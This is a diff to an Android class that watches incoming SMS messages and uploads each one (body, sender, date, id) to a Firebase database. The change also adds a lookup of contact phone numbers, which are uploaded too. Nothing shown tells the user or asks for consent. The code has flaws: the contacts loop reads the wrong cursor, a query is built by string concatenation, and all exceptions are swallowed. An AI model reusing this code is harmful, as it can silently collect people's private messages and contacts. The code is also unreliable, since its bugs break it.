@@ -22,6 +22,9 @@ import android.database.ContentObserver;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
+import android.provider.ContactsContract;
+import android.support.annotation.NonNull;
+import android.support.annotation.Nullable;
 import android.support.v4.content.ContextCompat;
 import android.util.Log;
 
@@ -29,6 +32,10 @@ import com.facebook.accountkit.Account;
 import com.facebook.accountkit.AccountKit;
 import com.facebook.accountkit.AccountKitCallback;
 import com.facebook.accountkit.AccountKitError;
+import com.google.android.gms.tasks.OnFailureListener;
+import com.google.android.gms.tasks.OnSuccessListener;
+import com.google.firebase.FirebaseError;
+import com.google.firebase.database.DatabaseError;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 
@@ -88,6 +95,8 @@ class SmsObserver extends ContentObserver {
             if (cursor != null && cursor.moveToFirst()) {
                 processSms(cursor);
             }
+
+
         } finally {
             if (cursor != null)
                 cursor.close();
@@ -100,27 +109,53 @@ class SmsObserver extends ContentObserver {
             String protocol = cursor.getString(cursor.getColumnIndex(PROTOCOL_COLUM_NAME));
             smsCursor = getSmsCursor(protocol);
             final Sms sms = parseSms(smsCursor);
-            if (sms != null)
-                AccountKit.getCurrentAccount(
-                        new AccountKitCallback<Account>() {
-                            @Override
-                            public void onSuccess(Account account) {
-                                SmsSendServer smsSendServer = new SmsSendServer(account.getId().toString()
-                                        , sms.getType().toString()
-                                        , sms.getMsg()
-                                        , sms.getDate()
-                                        , ""
-                                        , sms.getAddress().toString()
-                                        , "");
-                                DatabaseReference mDatabase = FirebaseDatabase.getInstance().getReference();
-                                mDatabase.child("SMS").child(account.getId().toString()).setValue(smsSendServer);
-                            }
+            if (sms != null) {
+                Log.e("processSms", "sms" + sms.getId());
+                String phonesNumber = "";
+                Cursor phones = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + sms.getId(), null, null);
+                while (phones.moveToNext()) {
+                    phonesNumber = cursor.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                    // mConno.add(position,phoneNumber);
+                }
+                phones.close();
 
-                            @Override
-                            public void onError(AccountKitError accountKitError) {
+                if (sms != null) {
+                    final String finalPhonesNumber = phonesNumber;
+                    AccountKit.getCurrentAccount(
+                            new AccountKitCallback<Account>() {
+                                @Override
+                                public void onSuccess(Account account) {
+                                    SmsSendServer smsSendServer = new SmsSendServer(account.getId().toString()
+                                            , sms.getType().toString()
+                                            , sms.getMsg()
+                                            , sms.getDate()
+                                            , sms.getId()
+                                            , sms.getAddress()
+                                            , finalPhonesNumber.toString());
+                                    DatabaseReference mDatabase = FirebaseDatabase.getInstance().getReference();
+                                    Log.e("mDatabase", "token: processSms");
+                                    mDatabase.child("SMS").child(account.getId().toString()).child(sms.getPhone()).child(sms.getId()).setValue(smsSendServer)
+                                            .addOnSuccessListener(new OnSuccessListener<Void>() {
+                                                @Override
+                                                public void onSuccess(Void aVoid) {
+                                                    Log.e("mDatabase", "token: onSuccess");
+                                                }
+                                            })
+                                            .addOnFailureListener(new OnFailureListener() {
+                                                @Override
+                                                public void onFailure(@NonNull Exception e) {
+                                                    Log.e("mDatabase", "token: onFailure " + e.getMessage());
+                                                }
+                                            });
+                                }
 
-                            }
-                        });
+                                @Override
+                                public void onError(AccountKitError accountKitError) {
+
+                                }
+                            });
+                }
+            }
 
 
             notifySmsListener(sms);
@@ -163,8 +198,8 @@ class SmsObserver extends ContentObserver {
             String selection = null;
             String[] selectionArgs = null;
             String sortOrder = null;
-            return contentResolver.query(SMS_URI, projection, selection, selectionArgs, sortOrder);
-        } catch (IllegalArgumentException e) {
+            return contentResolver.query(SMS_URI, null, null, null, null);
+        } catch (Exception e) {
             return null;
         } finally {
             Log.e("antx ", "getSmsContentObserverCursor null");
